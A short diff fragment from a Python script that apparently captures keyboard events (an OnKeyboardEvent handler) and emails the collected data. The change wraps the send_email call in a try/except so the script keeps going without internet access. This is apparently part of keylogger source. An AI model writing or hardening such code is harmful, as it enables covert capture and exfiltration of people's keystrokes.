@@ -151,8 +151,11 @@ def OnKeyboardEvent(event):
     return True #pass event to other handlers
 ###########################################################################
 
-#creates the directory 
-send_email(todays_number)
+#creates the directory
+try: 
+	send_email(todays_number)
+except:
+	print("No internet")
 create_Directory()
 
 
